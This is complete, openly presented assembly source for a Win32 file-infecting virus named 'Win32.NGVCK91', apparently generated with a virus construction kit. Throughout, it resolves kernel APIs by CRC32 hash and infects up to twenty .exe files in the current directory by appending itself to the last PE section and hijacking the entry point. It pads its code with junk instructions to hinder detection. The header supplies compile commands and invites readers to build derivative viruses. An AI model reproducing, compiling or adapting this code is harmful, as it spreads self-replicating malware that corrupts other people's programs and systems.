              
;
;
; Win32.NGVCK91 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK91
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 33
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov ebx, esi
                                        ; clear ebx
 xor ebx, ebx
 add ebx, esi
LenCRC:
                                        ; add ebx, 1
 add ebx, 1d
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, esi
                                        ; mov edi, ebx
                                        ; clear edi
 xor edi, edi
 add edi, ebx
                                        ; add edi, 1
 add edi, 1d
 cld
                                        ; clear eax
 and eax, 0
 sub eax, 1
                                        ; mov edx, eax
                                        ; clear edx
 mov edx, 26116d
 sub edx, 26116d
 add edx, eax
NextByteCRC:
                                        ; clear ebx
 mov ebx, -24274d
 add ebx, 24274d
                                        ; clear ecx
 mov ecx, 0
 mov bl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 xor bl, al
 mov al, ah
 mov ah, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr cx, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor cx,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor eax, ebx
 xor edx, ecx
 dec edi
jnz NextByteCRC
 not edx
 not eax
 mov ebx, edx
 rol ebx, 16d
 mov bx, ax
 push ebx
 pop dword ptr [ebp+APICRC32]
 popad
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop eax
 xor edx, eax                           ; Trash

 push eax
 pop dword ptr [ebp+retEIP]

                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+OldBase]

 push ebx
 pop dword ptr [ebp+retBase]




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov edx, 20
 mov edx, 0
 add edx, 20d
 mov dword ptr [ebp+InfCounter], edx
 lea ecx, [ebp+filemask]
 xchg edi, ecx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 dec eax
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+InfCounter]
 test ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]

 push esi
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, ( 276d - 35d )
 add ecx, 35d
 lea edi, [ebp+WFD_szFileName]

                                        ; clear eax
 mov eax, 64993d
 sub eax, 64993d
 rep stosb
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]

 push edi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [ebx+3Ch]
 add esi, ebx
                                        ; get File Alignment
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov eax, [esi]
 sub esi, 60d
                                        ; mov ebx, -1
 mov ebx, 0
 add ebx, -1d
 and ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; clear ebx
 mov ebx, 40757d
 sub ebx, 40757d
 xor ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 push ebx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, 7015d
 sub esi, 7015d
 add esi, ebx
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 sub edx, 1
 imul edx, edx, 28h
                                        ; add ebx, 120
 add ebx, 120d
 add ebx, edx
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [esi+74h]
 clc
 rcl ecx, 3
 add ebx, ecx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], edx
 mov eax, dword ptr [esi+34h]
 push eax
 pop dword ptr [ebp+OldBase]
                                        ; clear ecx
 mov ecx, 0

 xor edx, ecx                           ; Trash
 add ecx, [ebx+10h]
 dec dword ptr [ebp+Trash1]             ; Trash
                                        ; mov edx, ecx
                                        ; clear edx
 sub edx, edx
 add edx, ecx
 add ebx, 14h
 add ecx, [ebx]
 sub ebx, 14h
 push ecx
 push edx
 pop eax
 xor dword ptr [ebp+Trash1], 74504      ; Trash
 add eax, [ebx+0Ch]
 push eax
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], eax
 mov eax, [ebx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 adc dword ptr [ebp+Trash1], 255675     ; Trash
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [ebx+08h], 0
 add dword ptr [ebx+08h], eax
 mov eax, dword ptr [ebx+10h]
 add eax, dword ptr [ebx+0Ch]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov esi, offset Virus
 add esi, ebp

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 xor ebx, ebx

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 push 80000000h or 40000000h
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx

                                        ; clear ebx
 mov ebx, -33580d
 add ebx, 33580d
 push ebx
 push ecx
 push ebx
                                        ; mov edx, 4
 mov edx, ( 4d + 4d )
 sub edx, 4d
 push edx
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ecx
 cmp eax, 0
 je CloseFile
                                        ; clear eax
 mov eax, 27215d
 sub eax, 27215d
 push ecx
 push eax
 push eax
                                        ; mov edx, 2
 mov edx, ( 2d - 28d )
 add edx, 28d
 push edx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 neg edx                                ; Trash
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, -61735d
 add edx, 61735d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ecx

                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

                                        ; clear esi
 mov esi, 0
 xor esi, dword ptr [ebp+Trash1]
 sal eax, 28d                           ; Trash

 mov dword ptr [ebp+Trash2], 0
 xor dword ptr [ebp+Trash2], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 inc ebp
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 lea edx, [ebp+APIOffsets]
 xchg edx, esi

 lea eax, [ebp+APINames]
 xchg ecx, eax


GetApisLoop: 

                                        ; search 'em
                                        ; ecx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
                                        ; clear edi
 mov edi, 0
 add edi, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], edi
                                        ; add esi, 4
 add esi, 4d
 sub ebx, 1
 jnz GetApisLoop
 lea ebx, [ebp+Outbreak]
 xchg esi, ebx

 push esi
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 push dword ptr [ebp+NTableVA]
 pop eax
 adc edx, 53009489d                     ; Trash
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], -1
 and dword ptr [ebp+NTableTemp], eax
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [eax]
                                        ; mov eax, ebx
 push ebx
 pop eax
                                        ; mov esi, ebx
                                        ; clear esi
 mov esi, 0
 add esi, ebx
 push esi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], ecx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+APICRC32]
 sub ebx, dword ptr [ecx]
                                        ; add ebx, 1
 sub ebx, -1d
 sub ebx, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 mov ecx, dword ptr [ebp+TempApisearch3]
 mov eax, dword ptr [ebp+NTableTemp]
                                        ; add eax, 4
 add eax, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop esi
 movzx edx, word ptr [esi]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [edx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx

 push edx
 adc ebx, 88492995d                     ; Trash
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov edx, 128
 mov edx, ( 128d xor 5d )
 xor edx, 5d
 push edx
 mov edx, offset WFD_szFileName
 add edx, ebp


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz NoInfection
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]

 cmp dword ptr [edx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],esi
 jb Notagoodfile
 add esi, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov bx, word ptr [esi+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 push dword ptr [ebp+Attributes]
 pop ecx
 push ecx
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
 add esp, -4d
                                        ; round to pages
 xor bx, bx
                                        ; add ebx, 1
 inc ebx
GetKernelLoop:
                                        ; clear ecx
 mov ecx, 41979d
 sub ecx, 41979d
 sub ebx, 1
 mov cx, word ptr [ebx+03ch]
 cmp cx,0f800h
 je GetKernelLoop
 cmp ebx, dword ptr [ebx+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], ebx
 mov edx, [ebx+3Ch]
 add edx, ebx
 mov [KernelPE+ebp], edx
                                        ; clear esi
 mov esi, 0
 add esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [esi+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 inc ebx
 add ebx, 27d
                                        ; get ATableVA
 mov esi, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; get NTableVA
 mov esi, dword ptr [ebx]
 add esi, [ebp+KernelMZ]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 mov dword ptr [ebp+NTableVA], esi
                                        ; get OTableVA
 mov esi, dword ptr [ebx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
 lea ecx, [ebp+GetApis]
 xchg ecx, ebx

 push ebx
ret

;                  [ ///// * Data * \\\\\ ]

Data:
 counter     dw 0h
 OldBase     dd 400000h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Attributes  dd 0h
 MapHandle   dd 0h
 TempAPI     dd 0h
 ATableVA    dd 0h
 OldEIP      dd 0h
 MapAddress  dd 0h
 KernelMZ    dd 0h
 NewSize     dd 0h
 APICRC32    dd 0h

 APINames:
 dd 0797B49ECh           ; MapViewOfFile
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 068624A9Dh           ; CloseHandle
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0C200BE21h           ; FindClose
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 03C19E536h           ; SetFileAttributesA
 dd 094524B42h           ; UnmapViewOfFile
 dd 08C892DDFh           ; CreateFileA

 Trash1      dd 0h
 AlignReg2   dd 0h
 KernelPE    dd 0h
 db 'Win32.NGVCK91 - SnakeByte',0
 AlignReg1   dd 0h
 NewEIP      dd 0h
 TempApisearch3 dd 0h
 InfCounter  dd 0h
 Trash2      dd 0h
 filemask    db '*.EXe',0
 FindHandle  dd 0h
 OTableVA    dd 0h
 FileHandle  dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XGetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XSetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h

 NTableTemp  dd 0h
 NTableVA    dd 0h




CryptEnd:
 xor eax, 12071487d                     ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 mov edx, 41847d
 sub edx, 41847d
 push edx
 call ExitProcess



end FakeCode

